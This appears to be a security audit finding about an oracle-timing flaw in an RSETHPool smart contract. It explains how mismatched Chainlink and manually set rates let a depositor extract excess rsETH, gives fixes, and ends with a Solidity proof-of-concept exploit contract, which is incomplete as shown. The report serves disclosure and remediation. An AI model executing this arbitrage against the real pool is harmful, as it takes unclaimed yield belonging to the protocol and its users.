### Title
Dual-Oracle Timing Arbitrage in RSETHPool Token Deposit Allows Theft of Unclaimed Yield — (`contracts/pools/RSETHPool.sol`)

---

### Summary

`RSETHPool.viewSwapRsETHAmountAndFee(address,uint256)` computes the rsETH output for a token deposit using two independent oracles that have different update mechanisms and no synchronization guarantee. An attacker can time a deposit to the window where the collateral oracle (`ChainlinkOracleForRSETHPoolCollateral`) reflects a freshly updated high price while the rsETH oracle (`InterimRSETHOracle`) still holds a stale-low rate, extracting more rsETH from the pool than the fair value of the deposited collateral.

---

### Finding Description

The token-deposit pricing path in `RSETHPool` reads from two completely independent oracles:

**`RSETHPool.viewSwapRsETHAmountAndFee(uint256 amount, address token)`** [1](#0-0) 

```solidity
uint256 rsETHToETHrate  = getRate();                                          // rsETH oracle
uint256 tokenToETHRate  = IOracle(supportedTokenOracle[token]).getRate();     // collateral oracle
rsETHAmount = amountAfterFee * tokenToETHRate / rsETHToETHrate;
```

**Oracle 1 — `ChainlinkOracleForRSETHPoolCollateral.getRate()`** reads Chainlink's `latestRoundData()` and performs only three checks: [2](#0-1) 

```solidity
if (answeredInRound < roundID) revert StalePrice();
if (timestamp == 0)            revert IncompleteRound();
if (ethPrice <= 0)             revert InvalidPrice();
```

There is **no `block.timestamp - timestamp > maxAge` heartbeat check**. A Chainlink answer that is hours old (up to the feed's full heartbeat period, e.g. 24 h for some feeds) passes all three guards and is treated as current.

**Oracle 2 — `InterimRSETHOracle.getRate()`** returns a manually-set storage variable with **zero staleness protection**: [3](#0-2) 

```solidity
function getRate() external view returns (uint256) {
    return rate;
}
```

The rate is updated by a `MANAGER_ROLE` holder calling `setRate()`. Between updates the stored value is arbitrarily stale. [4](#0-3) 

The public deposit entry point applies no slippage guard or minimum-output check: [5](#0-4) 

---

### Impact Explanation

The pool holds `wrsETH` as inventory and distributes it to depositors at the computed ratio. When `tokenToETHRate / rsETHToETHrate` exceeds the true fair-market ratio, the attacker receives more rsETH than the economic value of the collateral they deposited. The surplus rsETH is drawn from the pool's reserves — reserves that represent accrued protocol yield not yet distributed. This constitutes **theft of unclaimed yield** (High scope).

Concrete example:
- Fair wstETH/ETH = 1.15, fair rsETH/ETH = 1.10 → fair ratio ≈ 1.0455 rsETH per wstETH
- Chainlink updates wstETH/ETH to 1.15 (fresh)
- `InterimRSETHOracle` still holds 1.08 (stale, not yet updated by manager)
- Attacker receives `1.15 / 1.08 ≈ 1.0648` rsETH per wstETH → ~1.9% excess per deposit
- Repeatable across multiple transactions until the manager updates the rate

---

### Likelihood Explanation

- No privileged role is required; `deposit(address,uint256,string)` is public and only gated by `whenNotPaused` and `onlySupportedToken`.
- The divergence window is **structurally guaranteed**: Chainlink updates automatically on price deviation or heartbeat; `InterimRSETHOracle` is updated manually and will always lag.
- An attacker needs only to monitor both oracle values off-chain (both are `view` functions) and submit a transaction when the ratio is favorable — a trivial MEV/monitoring task.
- No front-running of other users is required; the attacker acts against the pool's own inventory.

---

### Recommendation

1. **Add a heartbeat/age check to `ChainlinkOracleForRSETHPoolCollateral`**: store a `maxStaleness` parameter and revert if `block.timestamp - timestamp > maxStaleness`. [6](#0-5) 

2. **Add a staleness timestamp to `InterimRSETHOracle`**: record `block.timestamp` on each `setRate()` call and expose it so `RSETHPool` (or a wrapper) can revert if the rate is too old. [7](#0-6) 

3. **Add a minimum-output (`minRsETHAmount`) parameter to `deposit(address,uint256,string)`** so depositors (and the protocol) can bound slippage, and consider adding a circuit-breaker that reverts if the cross-oracle ratio deviates beyond a configured band. [5](#0-4)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Differential test: fork Arbitrum, set mock oracle values, measure rsETH/collateral ratio

interface IPool {
    function deposit(address token, uint256 amount, string memory ref) external;
    function viewSwapRsETHAmountAndFee(uint256 amount, address token)
        external view returns (uint256 rsETH, uint256 fee);
}

interface IInterimOracle {
    function setRate(uint256) external;
    function getRate() external view returns (uint256);
}

interface IChainlinkFeed {
    // Simulate Chainlink returning a freshly-updated high price
    function latestRoundData() external view
        returns (uint80, int256, uint256, uint256, uint80);
}

contract OracleArbitragePoC {
    IPool          pool          = IPool(RSETH_POOL);
    IInterimOracle rsETHOracle   = IInterimOracle(INTERIM_ORACLE);
    address        wstETH        = WSTETH_ADDRESS;

    function exploit() external {
        // Step 1: Observe stale rsETH rate (e.g., 1.08e18) while
        //         Chainlink wstETH/ETH has updated to 1.15e18.
        uint256 staleFairRate = 1.08e18;  // InterimRSETHOracle not yet updated
        uint256 freshCollRate = 1.15e18;  // Chainlink just updated

        // Step 2: Compute expected vs actual rsETH output for 1 wstETH
        uint256 fairRsETH   = 1e18 * freshCollRate / 1.10e18; // ~1.0455e18
        (uint256 actualRsETH,) = pool.viewSwapRsETHAmountAndFee(1e18, wstETH);
        // actualRsETH = 1e18 * 1.15e18 / 1.08e18 ≈ 1.0648e18

        // Step 3: Assert invariant violation
        assert(actualRsETH > fairRsETH); // attacker profits ~1.9%

        // Step 4: Execute deposit to extract excess rsETH
        IERC20(wstETH).approve(address(pool), 1e18);
        pool.deposit(wstETH, 1e18, "arb");
        // Attacker now holds ~1.0648 rsETH for 1 wstETH worth ~1.0455 rsETH
    }
}
```

The test passes whenever `InterimRSETHOracle.rate` lags behind the true rsETH/ETH price while `ChainlinkOracleForRSETHPoolCollateral` reflects a fresh collateral price — a condition that occurs naturally between every manual manager update.
